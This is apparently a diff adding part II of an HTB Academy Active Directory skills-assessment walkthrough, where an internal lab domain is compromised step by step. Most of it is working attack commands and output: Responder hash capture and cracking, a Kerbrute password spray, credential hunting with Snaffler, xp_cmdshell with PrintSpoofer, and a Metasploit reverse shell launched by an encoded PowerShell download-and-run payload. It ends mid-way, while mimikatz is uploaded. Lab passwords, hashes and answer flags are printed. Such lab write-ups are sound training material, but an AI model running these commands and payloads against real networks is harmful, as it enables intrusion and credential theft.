@@ -1,5 +1,7 @@
-# AD Enumeration & Attacks Skills Assessment
+# AD Enumeration & Attacks Skills Assessment I II 
 
+
+## I 
 ## Engagement
 A team member started an External Penetration Test and was moved to another urgent project before they could finish. 
 The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. 
@@ -509,20 +511,774 @@ C:\>type c:\users\administrator\desktop\flag.txt
 r3plicat1on_m@st3r!
 ```
 
+## II 
+
+Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using xfreerdp as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.
+
+
+## Engagement
+
+Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using xfreerdp as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.
+
+
+## Objectives
+
+- Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?
+- What is this user's cleartext password?
+- Submit the contents of the C:\flag.txt file on MS01.
+- Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.
+- What is this user's password?
+- Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?
+- Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.
+- Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.
+- Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?
+- Crack this user's password hash and submit the cleartext password as your answer.
+- Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.
+- Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.
+
+```
+ssh htb-student@10.129.118.236
+The authenticity of host '10.129.118.236 (10.129.118.236)' can't be established.
+ED25519 key fingerprint is SHA256:V725mj/gY+cKN6lWeODp9siHpvL9GMNLqiuvihxvP+8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.118.236' (ED25519) to the list of known hosts.
+htb-student@10.129.118.236's password: 
+Linux skills-par01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
+ ____                      _     ____            
+|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
+| |_) / _` | '__| '__/ _ \| __| \___ \ / _ \/ __|
+|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
+|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|
+                                                 
 
 
 
+The programs included with the Parrot GNU/Linux are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Parrot GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15
+┌─[htb-student@skills-par01]─[~]
+└──╼ $
+
+```
 
 
+Run Responder to try and attempt to steal hashes:
+
+```
+sudo responder -I ens224 -wrfv
+```
+
+<img width="1024" height="693" alt="image" src="https://github.com/user-attachments/assets/77cf448a-fed7-42ed-bd21-1c6f2f0ba11d" />
+
+user: `AB920`
+
+Crack the NTMLv2 hash with hashcat:
+
+```
+sudo nano hash.txt
+
+AB920::INLANEFREIGHT:db01ff67bf1dc695:B0A7BB024D6888223F7F227F89535B4A:01010000000000000099E359482BDC016161976174AA9B420000000002000800360036004F004D0001001E00570049004E002D0048004C0046005800500056004D004D0053003400540004003400570049004E002D0048004C0046005800500056004D004D005300340054002E00360036004F004D002E004C004F00430041004C0003001400360036004F004D002E004C004F00430041004C0005001400360036004F004D002E004C004F00430041004C00070008000099E359482BDC0106000400020000000800300030000000000000000000000000200000FBD902463033367F18EDE2FDB5636A11E532B4AD68BDD191DC9C380D5A3937DD0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
+
+```
+
+```
+hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+
+AB920::INLANEFREIGHT:7691a9c9f2e8e9c3:b103ceb4bd6a0d624c7b9d3bba2de97a:01010000000000000099e359482bdc014cf1412d9a453cfe0000000002000800360036004f004d0001001e00570049004e002d0048004c0046005800500056004d004d0053003400540004003400570049004e002d0048004c0046005800500056004d004d005300340054002e00360036004f004d002e004c004f00430041004c0003001400360036004f004d002e004c004f00430041004c0005001400360036004f004d002e004c004f00430041004c00070008000099e359482bdc0106000400020000000800300030000000000000000000000000200000fbd902463033367f18ede2fdb5636a11e532b4ad68bdd191dc9c380d5a3937dd0a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: AB920::INLANEFREIGHT:7691a9c9f2e8e9c3:b103ceb4bd6a0...000000
+Time.Started.....: Sun Sep 21 21:44:03 2025 (0 secs)
+Time.Estimated...: Sun Sep 21 21:44:03 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#2.........:  1882.9 kH/s (0.84ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 290816/14344385 (2.03%)
+Rejected.........: 0/290816 (0.00%)
+Restore.Point....: 288768/14344385 (2.01%)
+Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#2....: winers -> temyong
+
+Started: Sun Sep 21 21:43:55 2025
+Stopped: Sun Sep 21 21:44:04 2025
+┌─[eu-academy-5]─[10.10.14.50]─[htb-ac-943240@htb-yt9uk7eejp]─[~]
+└──╼ [★]$ 
+
+```
+
+password: `weasal`
+
+Run Nmap to discover more hosts in the 172.16.7.0/24 subnet:
+
+```
+┌─[htb-student@skills-par01]─[~]
+└──╼ $sudo nmap -p 88,445,3389 --open 172.16.7.0/24
+Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-21 22:46 EDT
+Nmap scan report for inlanefreight.local (172.16.7.3)
+Host is up (0.0017s latency).
+Not shown: 1 closed tcp port (reset)
+PORT    STATE SERVICE
+88/tcp  open  kerberos-sec
+445/tcp open  microsoft-ds
+MAC Address: 00:50:56:94:DE:62 (VMware)
+
+Nmap scan report for 172.16.7.50
+Host is up (0.0021s latency).
+Not shown: 1 closed tcp port (reset)
+PORT     STATE SERVICE
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+MAC Address: 00:50:56:94:E9:0A (VMware)
+
+Nmap scan report for 172.16.7.60
+Host is up (0.0017s latency).
+Not shown: 2 closed tcp ports (reset)
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 00:50:56:94:30:22 (VMware)
+
+Nmap scan report for 172.16.7.240
+Host is up (0.0012s latency).
+Not shown: 2 closed tcp ports (reset)
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+
+Nmap done: 256 IP addresses (4 hosts up) scanned in 27.94 seconds
+```
+
+Three hosts = 
+
+`172.16.7.3`
+`172.16.7.50`
+`172.16.7.60`
+
+Enumerate using bloodhound:
+
+```
+bloodhound-python -d INLANEFREIGHT.LOCAL -ns 172.16.7.3 -c All -u AB920 -p weasal
+```
+<img width="1019" height="668" alt="image" src="https://github.com/user-attachments/assets/a5db1e69-0a71-4ec2-af92-c356324ef32f" />
+
+Enumerate further, running Nmap against 172.16.7.50:
+
+```
+[htb-student@skills-par01]─[~]
+└──╼ $nmap -A 172.16.7.50
+Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-21 22:50 EDT
+Nmap scan report for 172.16.7.50
+Host is up (0.043s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-09-22T02:51:07+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
+| Not valid before: 2025-09-21T02:33:09
+|_Not valid after:  2026-03-23T02:33:09
+| rdp-ntlm-info: 
+|   Target_Name: INLANEFREIGHT
+|   NetBIOS_Domain_Name: INLANEFREIGHT
+|   NetBIOS_Computer_Name: MS01
+|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
+|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
+|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-09-22T02:51:02+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-09-22T02:51:02
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:e9:0a (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.48 seconds
+```
+
+Connect to MS01 using RDP, having the opportunity to use drive redirection:
+
+Reconnect forwarding X11 over ssh
+```
+ssh -X htb-student@<htb-box>
+```
+------>
+```
+┌─[htb-student@skills-par01]─[~]
+└──╼ $xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student/Desktop /dynamic-resolution
+```
+
+<img width="1265" height="786" alt="image" src="https://github.com/user-attachments/assets/7d31fa37-3dcb-483b-9a34-a15e187c7ec8" />
+
+ParrotOS jump-box will be accessible as a file share on MS01:
+
+<img width="760" height="344" alt="image" src="https://github.com/user-attachments/assets/3548489a-6b51-4b68-813a-02a42ef388c1" />
+
+<img width="1273" height="752" alt="image" src="https://github.com/user-attachments/assets/3e8799d2-c075-4a3c-8d01-856f6786c950" />
 
 
+Use PowerView and Kerbrute from MS01:
+
+```
+wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
+```
+
+<img width="1018" height="200" alt="image" src="https://github.com/user-attachments/assets/93921589-01de-4b31-a9be-67bba36425d7" />
+<img width="1011" height="152" alt="image" src="https://github.com/user-attachments/assets/67376177-70df-45cc-9ca8-42bd5c743588" />
+
+Using the previously established RDP session on MS01, use the shared drive in File Explorer and transfer PowerView.ps1 and Kerbrute to the Desktop:
+
+<img width="768" height="345" alt="image" src="https://github.com/user-attachments/assets/e944d04d-8bbd-4072-b9e6-795372db3ace" />
+
+In powershell execute the following:
+
+```
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\AB920> cd .\Desktop\
+PS C:\Users\AB920\Desktop> Set-ExecutionPolicy Bypass -Scope Process
+
+Execution Policy Change
+The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
+you to the security risks described in the about_Execution_Policies help topic at
+https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
+[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
+PS C:\Users\AB920\Desktop> Import-Module .\PowerView.ps1
+PS C:\Users\AB920\Desktop> Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt
+
+PS C:\Users\AB920\Desktop> Get-Content .\adusers.txt | select -First 10
+
+Administrator
+Guest
+krbtgt
+NY340
+RO050
+FF479
+EU303
+SX681
+AJ725
+PH432
+```
+
+Use kerbrute.exe to password spray against the user list generated:
+
+```
+PS C:\Users\AB920\Desktop> .\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 11/29/22 - Ronnie Flathers @ropnop
+
+2022/11/29 10:42:57 >  Using KDC(s):
+2022/11/29 10:42:57 >   DC01.INLANEFREIGHT.LOCAL:88
+2022/11/29 10:43:15 >  [+] VALID LOGIN:  BR086@INLANEFREIGHT.LOCAL:Welcome1  <----------------------
+2022/11/29 10:43:15 >  Done! Tested 2901 logins (1 successes) in 18.733 seconds
+PS C:\Users\AB920\Desktop>
+```
+
+user : `BR086`  password: `Welcome1`
 
 
+Run Snaffler.exe on MS01 to hunt for shares (It must be downloaded to Pwnbox and then transferred to the Parrot OS jump-box):
+
+```
+wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe
+scp Snaffler.exe htb-student@STMIP:/home/htb-student/Desktop
+```
+
+From MS01 use the shared drive to move Snaffler.exe to the Desktop.
+
+Using the previously established PowerShell session, use runas to launch a new PowerShell session as the BR086 user:
+
+```
+PS C:\Users\AB920\Desktop> runas /netonly /user:INLANEFREIGHT\BR086 powershell
+
+Enter the password for INLANEFREIGHT\BR086:
+
+Attempting to start powershell as user "INLANEFREIGHT\BR086" ...
+```
+
+Run Snaffler.exe to find a SQL connection string in a web.config file:
+
+```
+PS C:\Windows\System32>cd C:\users\AB920\Desktop
+PS C:\users\AB920\Desktop>.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
+
+ .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
+;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
+'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
+  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
+ 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
+  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
+                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler
 
 
+[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:10Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\Department Shares>(R) Share for department users
+[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:10Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\NETLOGON>(R) Logon server share
+[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:10Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\SYSVOL>(R) Logon server share
+[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:11Z [File] {Yellow}<KeepDbConnStringPw|R|connectionstring.{1,200}passw|1.2kB|2022-04-01 15:04:05Z>(\\DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Private\Development\web.config) etEnvironmentVariable\("computername"\)\+'\\SQLEXPRESS;database=master;Integrated\ Security=SSPI;Pooling=true"/>\ \n\ \ \ \ \ \ \ </masterDataServices>\ \ \n\ \ \ \ \ \ \ <connectionStrings>\n\ \ \ \ \ \ \ \ \ \ \ <add\ name="ConString"\ connectionString="Environment\.GetEnvironmentVariable\("computername"\)\+'\\SQLEXPRESS';Initial\ Catalog=Northwind;User\ ID=netdb;Password=D@ta_bAse_adm1n!"/>\n\ \ \ \ \ \ \ </connectionStrings>\n\ \ </system\.web>\n</co
+```
+
+info = `netdb;Password=D@ta_bAse_adm1n!`
+
+Use mssqlclient.py to connect to the MSSQL database at 172.16.7.60:
+
+<img width="1040" height="436" alt="image" src="https://github.com/user-attachments/assets/6d58c7e4-70f4-43dd-9673-6db5fea5e97f" />
+
+enable xp_cmdshell
+
+<img width="1034" height="193" alt="image" src="https://github.com/user-attachments/assets/16f80ff8-59d6-4739-9acf-8b44709b4051" />
+
+Check the user's privileges to discover that SeImpersonatePrivilege is enabled:
+
+```
+SQL> xp_cmdshell whoami /priv
+
+output                                                                             
+
+PRIVILEGES INFORMATION                                                             
+----------------------                                                             
+Privilege Name                Description                               State      
+
+============================= ========================================= ========   
+
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
+SeCreateGlobalPrivilege       Create global objects                     Enabled    
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+
+Escalate privileges using PrintSpoofer. Transfer the PrintSpoofer64.exe from Pwnbox to the Parrot OS jump-box:
 
 
+```
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop
+```
+<img width="1041" height="177" alt="image" src="https://github.com/user-attachments/assets/6e24702d-1159-4b44-a347-31ec8e208228" />
 
+Start a web server from the skills-par01 jump-box; after transferring the printspooler from above -> use in the previous xp_cmdshell + ssh into new session
+and host webserver to grab:
+
+<img width="1035" height="192" alt="image" src="https://github.com/user-attachments/assets/7565ceab-399f-4671-b403-dfee1ad6fea2" />
+
++
+```
+SQL> xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+****  Online  ****                                                                 
+
+  0000  ...                                                                        
+
+  6a00                                                                             
+
+CertUtil: -URLCache command completed successfully.                                
+
+NULL                                                                               
+
+SQL> 
+```
+
+Use PrintSpoofer.exe to run commands as SYSTEM. Change the password for the current local administrator (setting it to Welcome1 in here):
+
+```
+SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+[+] Found privilege: SeImpersonatePrivilege                                        
+
+[+] Named pipe listening...                                                        
+
+[+] CreateProcessAsUser() OK                                                       
+
+NULL                                                                               
+
+```
+
+-->
+
+```
+smbclient -U "administrator" \\\\172.16.7.60\\C$
+Enter WORKGROUP\administrator's password: 
+Try "help" to get a list of possible commands.
+smb: \> cd Users\Administrator\Desktop\
+get flag.txt
+exit
+cat flag.txt
+smb: \Users\Administrator\Desktop\> ls
+  .                                  DR        0  Mon Apr 11 23:32:59 2022
+  ..                                 DR        0  Mon Apr 11 23:32:59 2022
+  desktop.ini                       AHS      282  Fri Apr  1 11:36:27 2022
+  flag.txt                            A       21  Mon Apr 11 23:33:06 2022
+
+		7706623 blocks of size 4096. 4211715 blocks available
+smb: \Users\Administrator\Desktop\> get flag.txt
+getting file \Users\Administrator\Desktop\flag.txt of size 21 as flag.txt (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)
+smb: \Users\Administrator\Desktop\> exit
+┌─[htb-student@skills-par01]─[~/Desktop]
+└──╼ $ cat flag.txt
+s3imp3rs0nate_cl@ssic┌─[htb-student@skills-par01]─[~/Desktop]
+```
+flag = `s3imp3rs0nate_cl@ssic`
+
+Meterpreter web_delivery payload from the ParrotOS jump-box:
+
+```
+search web_delivery
+
+Matching Modules
+================
+
+   #   Name                                                        Disclosure Date  Rank       Check  Description
+   -   ----                                                        ---------------  ----       -----  -----------
+   0   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+   1     \_ target: Automatic                                      .                .          .      .
+   2     \_ target: Unix/OSX/Linux                                 .                .          .      .
+   3     \_ target: Windows - PowerShell (In-Memory)               .                .          .      .
+   4     \_ target: Windows (CMD)                                  .                .          .      .
+   5   exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery  <----- 
+   6     \_ target: Python                                         .                .          .      .
+   7     \_ target: PHP                                            .                .          .      .
+   8     \_ target: PSH                                            .                .          .      .
+   9     \_ target: Regsvr32                                       .                .          .      .
+   10    \_ target: pubprn                                         .                .          .      .
+   11    \_ target: SyncAppvPublishingServer                       .                .          .      .
+   12    \_ target: PSH (Binary)                                   .                .          .      .
+   13    \_ target: Linux                                          .                .          .      .
+   14    \_ target: Mac OS X                         
+
+```
+```
+sudo msfconsole -q
+search web_delivery
+use 5
+set payload windows/x64/meterpreter/reverse_tcp
+set TARGET 2
+set SRVHOST 172.16.7.240
+set LHOST 172.16.7.240
+exploit
+```
+
+```
+┌─[htb-student@skills-par01]─[~/Desktop]
+└──╼ $sudo msfconsole -q
+
+[msf](Jobs:0 Agents:0) >> search web_delivery
+
+Matching Modules
+================
+
+   #  Name                                                        Disclosure Date  Rank       Check  Description
+   -  ----                                                        ---------------  ----       -----  -----------
+   0  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+   1  exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/script/web_delivery
+
+[msf](Jobs:0 Agents:0) >> use 1
+[*] Using configured payload python/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set TARGET 2
+TARGET => 2
+[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set SRVHOST 172.16.7.240
+SRVHOST => 172.16.7.240
+[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set LHOST 172.16.7.240
+LHOST => 172.16.7.240
+[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> exploit
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 172.16.7.240:4444 
+[*] Using URL: http://172.16.7.240:8080/za1FaPR8o
+[*] Server started.
+[*] Run the following command on the target machine:
+[msf](Jobs:1 Agents:0) exploit(multi/script/web_delivery) >> powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABzAGQAawBfAEoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcwBkAGsAXwBKAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcwBkAGsAXwBKAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AegBhADEARgBhAFAAUgA4AG8ALwBhAGIAWQBHADEAagA4AHIAegByAHkATQB4AFEAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4ANwAuADIANAAwADoAOAAwADgAMAAvAHoAYQAxAEYAYQBQAFIAOABvACcAKQApADsA
+```
+
+Run the encoded PowerShell payload from the xp_cmdshell PrintSpoofer:
+
+```
+SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABzAGQAawBfAEoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcwBkAGsAXwBKAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcwBkAGsAXwBKAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AegBhADEARgBhAFAAUgA4AG8ALwBhAGIAWQBHADEAagA4AHIAegByAHkATQB4AFEAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4ANwAuADIANAAwADoAOAAwADgAMAAvAHoAYQAxAEYAYQBQAFIAOABvACcAKQApADsA"
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+[+] Found privilege: SeImpersonatePrivilege                                        
+
+[+] Named pipe listening...                                                        
+
+[+] CreateProcessAsUser() OK                                                       
+
+NULL                                                                               
+
+SQL> 
+
+```
+
+Meterpreter session verifying SYSTEM privileges:
+
+```
+[*] 172.16.7.60      web_delivery - Delivering AMSI Bypass (1375 bytes)
+[*] 172.16.7.60      web_delivery - Delivering Payload (3692 bytes)
+[*] Sending stage (200262 bytes) to 172.16.7.60
+[*] Meterpreter session 1 opened (172.16.7.240:4444 -> 172.16.7.60:53991 ) at 2022-11-29 13:06:07 -0500
+
+[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) >> sessions -i 1
+[*] Starting interaction with 1...
+
+(Meterpreter 1)(C:\Windows\system32) > shell
+Process 4076 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+
+nt authority\system
+```
+
+Using the privileges of the super user,  extract passwords from memory using mimikatz.exe after transferring to the jump-box:
+
+```
+cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe mimikatz64.exe
+scp mimikatz64.exe htb-student@STMIP:/home/htb-student/Desktop
+```
+
+Then using the meterpreter session, upload mimikatz:
+
+```
+(Meterpreter 1)(C:\) > upload mimikatz64.exe
+
